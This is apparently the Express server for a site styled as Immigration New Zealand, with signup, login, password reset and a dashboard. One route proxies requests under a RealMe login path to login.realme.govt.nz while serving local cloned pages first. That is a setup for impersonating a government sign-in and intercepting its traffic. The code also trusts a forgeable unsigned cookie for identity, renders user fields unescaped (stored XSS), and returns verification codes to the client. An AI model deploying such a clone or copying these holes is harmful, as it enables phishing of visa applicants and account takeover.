require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const https = require('https');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;
const COOKIE_MAX_AGE = 60 * 60 * 1000;

let admin = null;
let db = null;
let firebaseInitError = null;

try {
  admin = require('firebase-admin');

  const projectId = process.env.FIREBASE_PROJECT_ID;
  const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
  const privateKey = process.env.FIREBASE_PRIVATE_KEY
    ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
    : '';

  if (!projectId || !clientEmail || !privateKey) {
    firebaseInitError =
      'Firebase is not configured. Set FIREBASE_PROJECT_ID, FIREBASE_CLIENT_EMAIL, and FIREBASE_PRIVATE_KEY before using login or signup.';
  } else {
    if (!admin.apps.length) {
      admin.initializeApp({
        credential: admin.credential.cert({
          projectId,
          clientEmail,
          privateKey,
        }),
      });
    }

    db = admin.firestore();
  }
} catch (error) {
  firebaseInitError =
    'Firebase Admin SDK is not installed. Run `npm.cmd install firebase-admin` in the project folder.';
}

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Serve static files
app.use(express.static(path.join(__dirname)));

function buildRedirect(pathname, params = {}) {
  const query = new URLSearchParams(params);
  const suffix = query.toString() ? `?${query.toString()}` : '';
  return `${pathname}${suffix}`;
}

function getCookieUser(req) {
  if (!req.cookies.user) {
    return null;
  }

  try {
    return JSON.parse(req.cookies.user);
  } catch (error) {
    return null;
  }
}

function setUserCookie(res, user) {
  res.cookie(
    'user',
    JSON.stringify({
      uid: user.uid,
      username: user.username,
      email: user.email,
      name: user.name || user.username,
    }),
    {
      maxAge: COOKIE_MAX_AGE,
      httpOnly: true,
      sameSite: 'lax',
    }
  );
}

function ensureFirebaseReady() {
  if (!db) {
    throw new Error(firebaseInitError || 'Firebase is not ready.');
  }

  return db;
}

function normalizeValue(value) {
  return String(value || '').trim();
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
  return { salt, hash };
}

function verifyPassword(password, salt, expectedHash) {
  const computedHash = crypto.scryptSync(password, salt, 64);
  const storedHash = Buffer.from(expectedHash, 'hex');

  return (
    computedHash.length === storedHash.length &&
    crypto.timingSafeEqual(computedHash, storedHash)
  );
}

function isFirebaseConfigured() {
  return !!db;
}

// In-memory fallback store for DEMO mode (when Firebase is not configured).
// All reads/writes are lost when server restarts. Enable signup/login to work
// out-of-the-box without any credentials. Swap to Firestore automatically
// once FIREBASE_PROJECT_ID / CLIENT_EMAIL / PRIVATE_KEY are set in .env.
const demoUsersByUid = new Map();
const demoUsersByUsername = new Map();
const demoUsersByEmail = new Map();

async function findUserByField(field, value) {
  if (isFirebaseConfigured()) {
    const firestore = ensureFirebaseReady();
    const snapshot = await firestore
      .collection('users')
      .where(field, '==', value)
      .limit(1)
      .get();

    if (snapshot.empty) {
      return null;
    }

    const doc = snapshot.docs[0];
    return { uid: doc.id, ...doc.data() };
  }

  switch (field) {
    case 'usernameLower':
      return demoUsersByUsername.get(String(value).toLowerCase()) || null;
    case 'emailLower':
      return demoUsersByEmail.get(String(value).toLowerCase()) || null;
    default:
      return null;
  }
}

async function createUser(userData) {
  if (isFirebaseConfigured()) {
    const firestore = ensureFirebaseReady();
    const userRef = firestore.collection('users').doc();
    const record = {
      ...userData,
      uid: userRef.id,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    };
    await userRef.set(record);
    return { ...record, uid: userRef.id };
  }

  const uid = crypto.randomBytes(12).toString('hex');
  const record = { ...userData, uid, createdAt: Date.now() };
  demoUsersByUid.set(uid, record);
  if (record.usernameLower) demoUsersByUsername.set(record.usernameLower, record);
  if (record.emailLower) demoUsersByEmail.set(record.emailLower, record);
  return record;
}

async function updateUserPassword(uid, passwordHash, passwordSalt) {
  if (isFirebaseConfigured()) {
    const firestore = ensureFirebaseReady();
    await firestore
      .collection('users')
      .doc(uid)
      .update({
        passwordHash,
        passwordSalt,
        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      });
    return;
  }

  const record = demoUsersByUid.get(uid);
  if (!record) return;
  record.passwordHash = passwordHash;
  record.passwordSalt = passwordSalt;
  record.updatedAt = Date.now();
}

async function findUserByUidResetFallback(email, username) {
  if (!isFirebaseConfigured()) {
    const byEmail = email ? demoUsersByEmail.get(String(email).toLowerCase()) : null;
    if (byEmail) return byEmail;
    const byUser = username ? demoUsersByUsername.get(String(username).toLowerCase()) : null;
    if (byUser) return byUser;
  }
  return null;
}

function isAuthenticated(req, res, next) {
  const user = getCookieUser(req);

  if (!user) {
    res.redirect('/login');
    return;
  }

  req.user = user;
  next();
}

// Proxy ALL requests to realme.govt.nz for that directory
app.all('/32179062-92f6-4eb0-89bc-df400a9e0367/B2C_1A_DIA_RealMe_LoginService/*', (req, res) => {
  const indexPath = path.join(__dirname, req.path, 'index.htm');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
    return;
  }

  const targetUrl = `https://login.realme.govt.nz${req.url}`;
  const parsedUrl = url.parse(targetUrl);

  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 443,
    path: parsedUrl.path,
    method: req.method,
    headers: {
      ...req.headers,
      host: parsedUrl.hostname,
    },
  };

  const proxyReq = https.request(options, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => {
    res.status(500).send('Proxy error');
  });

  req.pipe(proxyReq);
});

// Root route to serve index.htm
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.htm'));
});

// Routes
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'index.htm'));
});

app.get('/login/signup', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'signup.htm'));
});

app.get('/login/forgot-username', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'forgot-username.htm'));
});

app.get('/login/forgot-password', (req, res) => {
  res.sendFile(path.join(__dirname, 'login', 'forgot-password.htm'));
});

// ---------- Email verification for signup ----------
const verificationCodes = new Map(); // emailLower → { code, expires, verified }

function generateVerificationCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

app.post('/send-verification-code', async (req, res) => {
  const email = normalizeValue(req.body.email);

  if (!email) {
    return res.status(400).json({ error: 'Email address is required.' });
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }

  try {
    // Optional: block already-registered emails
    if (isFirebaseConfigured()) {
      const existing = await findUserByField('emailLower', email.toLowerCase());
      if (existing) {
        return res.status(400).json({ error: 'That email address is already registered.' });
      }
    }

    const code = generateVerificationCode();
    const key = email.toLowerCase();

    verificationCodes.set(key, {
      code,
      expires: Date.now() + 10 * 60 * 1000, // 10 minutes
      verified: false,
    });

    // Demo style (same as your forgot-password flow).
    // Replace later with a real email service (nodemailer, SendGrid, etc.).
    console.log(`[Verification] Code for ${email}: ${code}`);

    return res.json({
      success: true,
      message: `A verification code has been sent to ${email}.`,
      // Remove demoCode in production once real email is wired up
      demoCode: code,
    });
  } catch (error) {
    return res.status(500).json({
      error: error.message || 'Unable to send verification code right now.',
    });
  }
});

app.post('/confirm-verification-code', (req, res) => {
  const email = normalizeValue(req.body.email);
  const code = normalizeValue(req.body.code);

  if (!email || !code) {
    return res.status(400).json({ error: 'Email and confirmation code are required.' });
  }

  const key = email.toLowerCase();
  const entry = verificationCodes.get(key);

  if (!entry || entry.code !== code || Date.now() > entry.expires) {
    return res.status(400).json({ error: 'Invalid or expired confirmation code.' });
  }

  // Mark as verified so /register can accept it
  entry.verified = true;
  entry.expires = Date.now() + 30 * 60 * 1000; // keep verified state for 30 min
  verificationCodes.set(key, entry);

  return res.json({
    success: true,
    message: 'Email address confirmed successfully.',
  });
});

// ---------- Register (now requires verified email) ----------
app.post('/register', async (req, res) => {
  const email = normalizeValue(req.body.email);
  const username = normalizeValue(req.body.username);
  const password = normalizeValue(req.body.password);
  const confirmPassword = normalizeValue(req.body.confirmPassword);

  if (!email || !username || !password || !confirmPassword) {
    res.redirect(buildRedirect('/login/signup', { error: 'All fields are required.' }));
    return;
  }

  // Require email verification
  const verification = verificationCodes.get(email.toLowerCase());
  if (!verification || !verification.verified || Date.now() > verification.expires) {
    res.redirect(
      buildRedirect('/login/signup', {
        error: 'Please verify your email address before creating an account.',
      })
    );
    return;
  }

  if (username.length < 4) {
    res.redirect(
      buildRedirect('/login/signup', { error: 'Username must be at least 4 characters.' })
    );
    return;
  }

  if (password.length < 8) {
    res.redirect(
      buildRedirect('/login/signup', { error: 'Password must be at least 8 characters.' })
    );
    return;
  }

  if (password !== confirmPassword) {
    res.redirect(buildRedirect('/login/signup', { error: 'Passwords do not match.' }));
    return;
  }

  try {
    if (isFirebaseConfigured()) {
      const existingUsername = await findUserByField('usernameLower', username.toLowerCase());
      if (existingUsername) {
        res.redirect(
          buildRedirect('/login/signup', { error: 'That username is already registered.' })
        );
        return;
      }

      const existingEmail = await findUserByField('emailLower', email.toLowerCase());
      if (existingEmail) {
        res.redirect(
          buildRedirect('/login/signup', { error: 'That email address is already registered.' })
        );
        return;
      }
    }

    const { salt, hash } = hashPassword(password);
    const userObj = {
      username,
      usernameLower: username.toLowerCase(),
      email,
      emailLower: email.toLowerCase(),
      name: username,
      passwordHash: hash,
      passwordSalt: salt,
    };
    const user = await createUser(userObj);

    // Clean up the verification entry
    verificationCodes.delete(email.toLowerCase());

    setUserCookie(res, user);
    res.redirect('/dashboard');
  } catch (error) {
    res.redirect(
      buildRedirect('/login/signup', {
        error: error.message || 'Unable to create your account right now.',
      })
    );
  }
});

app.post('/login', async (req, res) => {
  const username = normalizeValue(req.body.username);
  const password = normalizeValue(req.body.password);

  if (!username || !password) {
    res.redirect(buildRedirect('/login', { error: 'Enter your username and password.' }));
    return;
  }

  try {
    let user = await findUserByField('usernameLower', username.toLowerCase());
    if (!user && !isFirebaseConfigured()) {
      user = demoUsersByUsername.get(username.toLowerCase()) || null;
    }
    if (!user || !verifyPassword(password, user.passwordSalt, user.passwordHash)) {
      res.redirect(buildRedirect('/login', { error: 'Invalid username or password.' }));
      return;
    }

    setUserCookie(res, user);
    res.redirect('/dashboard');
  } catch (error) {
    res.redirect(
      buildRedirect('/login', {
        error: error.message || 'Unable to sign you in right now.',
      })
    );
  }
});

app.get('/dashboard', isAuthenticated, (req, res) => {
  const initials = (req.user.name || req.user.username || 'U')
    .split(' ')
    .map(s => s.charAt(0).toUpperCase())
    .join('')
    .slice(0, 2);
  const displayName = req.user.name || req.user.username;
  const userName = req.user.username;
  const userEmail = req.user.email;

  res.send(`
    <!doctype html>
    <html lang="en-NZ">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Dashboard - Immigration New Zealand</title>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
      <style>
        :root{
          --orange:#e35205;
          --orange-dark:#cf4900;
          --orange-light:#fff1e9;
          --bg:#f3f3f3;
          --text:#1f1f1f;
          --muted:#6f6f6f;
          --border:#c9c9c9;
          --line:#d5d5d5;
          --card:#ffffff;
          --shadow:0 2px 8px rgba(0,0,0,.06);
          --shadow-hover:0 6px 20px rgba(227,82,5,.12);
        }
        *{box-sizing:border-box}
        body{
          margin:0;
          font-family:"Inter",Arial,sans-serif;
          background:var(--bg);
          color:var(--text);
          min-height:100vh;
        }
        .topbar{
          background:#000;
          height:64px;
          display:flex;
          align-items:center;
          border-bottom:3px solid var(--orange);
        }
        .topbar-inner{
          width:100%;
          max-width:1280px;
          margin:0 auto;
          padding:0 28px;
          display:flex;
          justify-content:space-between;
          align-items:center;
        }
        .brand{
          display:flex;
          align-items:center;
          gap:14px;
          color:#fff;
        }
        .brand-mark{
          width:36px;height:36px;border-radius:8px;
          background:var(--orange);
          display:grid;place-items:center;
          color:#fff;font-weight:800;font-size:16px;
          letter-spacing:-.02em;
        }
        .brand-text .title{
          font-size:16px;font-weight:700;letter-spacing:-.01em;
        }
        .brand-text .sub{
          font-size:10px;color:#bdbdbd;margin-top:2px;letter-spacing:.02em;
        }
        nav.topnav{
          display:flex;align-items:center;gap:4px;
        }
        nav.topnav a{
          color:#e8e8e8;text-decoration:none;font-size:13px;font-weight:500;
          padding:8px 14px;border-radius:6px;transition:background .15s,color .15s;
        }
        nav.topnav a:hover{background:rgba(255,255,255,.08);color:#fff}
        nav.topnav a.active{
          background:var(--orange);color:#fff;
        }
        nav.topnav a.logout{
          color:#ffd1c0;margin-left:6px;
        }
        nav.topnav a.logout:hover{
          background:rgba(227,82,5,.18);color:#fff;
        }
        .page{
          max-width:1280px;margin:0 auto;padding:32px 28px 56px;
        }
        .page-head{
          display:flex;align-items:flex-end;justify-content:space-between;
          margin-bottom:24px;flex-wrap:wrap;gap:16px;
        }
        .page-head h1{
          margin:0;font-size:28px;font-weight:300;color:var(--orange);
          letter-spacing:-.02em;
        }
        .page-head .crumbs{
          font-size:12px;color:var(--muted);
        }
        .welcome-card{
          background:linear-gradient(135deg,var(--orange) 0%,#f26b22 100%);
          color:#fff;border-radius:16px;padding:28px 32px;
          display:grid;grid-template-columns:auto 1fr auto;gap:24px;align-items:center;
          box-shadow:0 8px 28px rgba(227,82,5,.28);
          margin-bottom:28px;
          position:relative;overflow:hidden;
        }
        .welcome-card::after{
          content:"";position:absolute;right:-60px;top:-60px;
          width:240px;height:240px;border-radius:50%;
          background:rgba(255,255,255,.06);
        }
        .welcome-card::before{
          content:"";position:absolute;right:80px;bottom:-100px;
          width:200px;height:200px;border-radius:50%;
          background:rgba(255,255,255,.05);
        }
        .avatar{
          width:78px;height:78px;border-radius:50%;
          background:rgba(255,255,255,.18);
          border:2px solid rgba(255,255,255,.35);
          display:grid;place-items:center;
          font-size:28px;font-weight:700;letter-spacing:-.02em;
          color:#fff;backdrop-filter:blur(6px);
        }
        .welcome-info{
          position:relative;z-index:1;
        }
        .welcome-info .label{
          font-size:11px;text-transform:uppercase;letter-spacing:.1em;
          color:rgba(255,255,255,.7);font-weight:600;margin-bottom:6px;
        }
        .welcome-info .hello{
          font-size:24px;font-weight:600;margin:0 0 4px;
          letter-spacing:-.02em;
        }
        .welcome-info .meta{
          font-size:13px;color:rgba(255,255,255,.88);margin:0;
        }
        .welcome-info .meta span{opacity:.7;margin:0 8px}
        .status-pill{
          position:relative;z-index:1;
          background:rgba(255,255,255,.16);
          border:1px solid rgba(255,255,255,.25);
          color:#fff;font-size:12px;font-weight:600;
          padding:8px 14px;border-radius:999px;
          display:inline-flex;align-items:center;gap:8px;
          backdrop-filter:blur(6px);
        }
        .status-pill::before{
          content:"";width:8px;height:8px;border-radius:50%;
          background:#4ade80;box-shadow:0 0 0 3px rgba(74,222,128,.25);
        }
        .grid-cards{
          display:grid;gap:20px;
          grid-template-columns:repeat(3,1fr);
        }
        .action-card{
          background:var(--card);
          border:1px solid var(--line);
          border-radius:14px;padding:24px;
          box-shadow:var(--shadow);
          transition:transform .18s ease,box-shadow .18s ease,border-color .18s ease;
          text-decoration:none;color:inherit;
          display:block;position:relative;
        }
        .action-card:hover{
          transform:translateY(-3px);
          box-shadow:var(--shadow-hover);
          border-color:var(--orange);
        }
        .action-card .icon{
          width:52px;height:52px;border-radius:12px;
          background:var(--orange-light);color:var(--orange);
          display:grid;place-items:center;margin-bottom:16px;
          font-size:24px;
        }
        .action-card h3{
          margin:0 0 6px;font-size:16px;font-weight:600;color:var(--text);
        }
        .action-card p{
          margin:0;font-size:13px;color:var(--muted);line-height:1.5;
        }
        .action-card .arrow{
          position:absolute;top:24px;right:24px;
          width:28px;height:28px;border-radius:50%;
          background:var(--orange-light);color:var(--orange);
          display:grid;place-items:center;font-size:12px;font-weight:700;
          transition:background .18s,transform .18s;
        }
        .action-card:hover .arrow{
          background:var(--orange);color:#fff;transform:translateX(2px);
        }
        @media (max-width:960px){
          .grid-cards{grid-template-columns:repeat(2,1fr)}
          .welcome-card{grid-template-columns:auto 1fr}
          .welcome-card .status-pill{grid-column:1/-1;justify-self:start}
        }
        @media (max-width:640px){
          .topbar-inner{padding:0 16px}
          nav.topnav{display:none}
          .page{padding:22px 16px 40px}
          .welcome-card{padding:22px;border-radius:14px;gap:16px}
          .avatar{width:64px;height:64px;font-size:22px}
          .welcome-info .hello{font-size:20px}
          .grid-cards{grid-template-columns:1fr}
        }
      </style>
    </head>
    <body>
      <header class="topbar">
        <div class="topbar-inner">
          <div class="brand">
            <div class="brand-mark">INZ</div>
            <div class="brand-text">
              <div class="title">Immigration New Zealand</div>
              <div class="sub">TE PAPA KAWANA KIWI</div>
            </div>
          </div>
          <nav class="topnav">
            <a href="/">Home</a>
            <a href="/visas">Visas</a>
            <a href="/apply">Apply</a>
            <a href="/dashboard" class="active">Dashboard</a>
            <a href="/logout" class="logout">Logout</a>
          </nav>
        </div>
      </header>

      <main class="page">
        <div class="page-head">
          <div>
            <div class="crumbs">Home / My Dashboard</div>
            <h1>My Dashboard</h1>
          </div>
        </div>

        <section class="welcome-card">
          <div class="avatar">${initials}</div>
          <div class="welcome-info">
            <div class="label">Signed in</div>
            <h2 class="hello">Kia ora, ${displayName}!</h2>
            <p class="meta">${userName}<span>|</span>${userEmail}</p>
          </div>
          <span class="status-pill">Account Active</span>
        </section>

        <section class="grid-cards">
          <a href="/visas" class="action-card">
            <div class="icon">📋</div>
            <h3>Browse Visas</h3>
            <p>Explore visa options, eligibility criteria, and find the right pathway for your situation.</p>
            <div class="arrow">→</div>
          </a>

          <a href="/apply" class="action-card">
            <div class="icon">📝</div>
            <h3>Start Application</h3>
            <p>Begin a new visa or citizenship application, upload documents, and track your progress.</p>
            <div class="arrow">→</div>
          </a>

          <a href="/logout" class="action-card">
            <div class="icon">🚪</div>
            <h3>Sign Out Securely</h3>
            <p>End your session and protect your account information when using shared devices.</p>
            <div class="arrow">→</div>
          </a>
        </section>
      </main>
    </body>
    </html>
  `);
});

app.get('/logout', (req, res) => {
  res.clearCookie('user');
  res.redirect('/');
});

const resetCodes = new Map();

function generateResetCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

app.post('/forgot-password', async (req, res) => {
  const username = normalizeValue(req.body.username);
  const email = normalizeValue(req.body.email);

  if (!username || !email) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        error: 'Enter your username and email address.',
      })
    );
    return;
  }

  try {
    const user = await findUserByField('usernameLower', username.toLowerCase());
    if (!user || user.emailLower !== email.toLowerCase()) {
      res.redirect(
        buildRedirect('/login/forgot-password', {
          error: 'No account matches those details.',
        })
      );
      return;
    }

    const code = generateResetCode();
    const key = `${username.toLowerCase()}:${email.toLowerCase()}`;
    resetCodes.set(key, { code, expires: Date.now() + 10 * 60 * 1000, uid: user.uid });

    res.redirect(
      buildRedirect('/login/forgot-password', {
        step: 'reset',
        username,
        email,
        success: `Reset code sent (demo): ${code}. Enter it below to continue.`,
      })
    );
  } catch (error) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        error: error.message || 'Unable to send reset code right now.',
      })
    );
  }
});

app.post('/reset-password', async (req, res) => {
  const username = normalizeValue(req.body.username);
  const email = normalizeValue(req.body.email);
  const resetCode = normalizeValue(req.body.resetCode);
  const password = normalizeValue(req.body.password);
  const confirmPassword = normalizeValue(req.body.confirmPassword);

  if (!username || !email || !resetCode || !password || !confirmPassword) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        step: 'reset',
        username,
        email,
        error: 'All fields are required.',
      })
    );
    return;
  }

  if (password.length < 8) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        step: 'reset',
        username,
        email,
        error: 'Password must be at least 8 characters.',
      })
    );
    return;
  }

  if (password !== confirmPassword) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        step: 'reset',
        username,
        email,
        error: 'Passwords do not match.',
      })
    );
    return;
  }

  try {
    const key = `${username.toLowerCase()}:${email.toLowerCase()}`;
    const entry = resetCodes.get(key);
    if (!entry || entry.code !== resetCode || Date.now() > entry.expires) {
      res.redirect(
        buildRedirect('/login/forgot-password', {
          step: 'reset',
          username,
          email,
          error: 'Invalid or expired reset code.',
        })
      );
      return;
    }

    const { salt, hash } = hashPassword(password);
    await updateUserPassword(entry.uid, hash, salt);

    if (!isFirebaseConfigured() && !demoUsersByUid.has(entry.uid)) {
      const fallbackUser = await findUserByUidResetFallback(email, username);
      if (fallbackUser) {
        await updateUserPassword(fallbackUser.uid, hash, salt);
      }
    }

    resetCodes.delete(key);
    res.redirect(
      buildRedirect('/login', {
        success: 'Your password has been reset. Sign in with your new password.',
      })
    );
  } catch (error) {
    res.redirect(
      buildRedirect('/login/forgot-password', {
        step: 'reset',
        username,
        email,
        error: error.message || 'Unable to reset your password right now.',
      })
    );
  }
});

app.post('/forgot-username', async (req, res) => {
  const email = normalizeValue(req.body.email);

  if (!email) {
    res.redirect(
      buildRedirect('/login/forgot-username', {
        error: 'Enter your email address.',
      })
    );
    return;
  }

  try {
    const user = await findUserByField('emailLower', email.toLowerCase());
    if (!user) {
      res.redirect(
        buildRedirect('/login/forgot-username', {
          success: 'If an account exists for that email, your username has been sent.',
        })
      );
      return;
    }

    res.redirect(
      buildRedirect('/login/forgot-username', {
        success: `Username sent (demo): Your username is "${user.username}".`,
      })
    );
  } catch (error) {
    res.redirect(
      buildRedirect('/login/forgot-username', {
        error: error.message || 'Unable to process your request right now.',
      })
    );
  }
});

// Catch-all route to serve index.htm for any path (directory or clean URL)
app.get('*', (req, res, next) => {
  let reqPath = req.path;

  if (reqPath.endsWith('.htm') || reqPath.endsWith('.html')) {
    const directPath = path.join(__dirname, reqPath);
    if (fs.existsSync(directPath) && fs.statSync(directPath).isFile()) {
      res.sendFile(directPath);
      return;
    }
  }

  let cleanPath = reqPath;
  if (cleanPath !== '/' && cleanPath.endsWith('/')) {
    cleanPath = cleanPath.slice(0, -1);
  }

  const candidates = [
    path.join(__dirname, cleanPath, 'index.htm'),
    path.join(__dirname, reqPath, 'index.htm'),
    path.join(__dirname, cleanPath + '.htm'),
    path.join(__dirname, cleanPath + '.html'),
  ];

  for (const candidate of candidates) {
    try {
      if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
        res.sendFile(candidate);
        return;
      }
    } catch (_) {
      // skip invalid paths
    }
  }

  next();
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});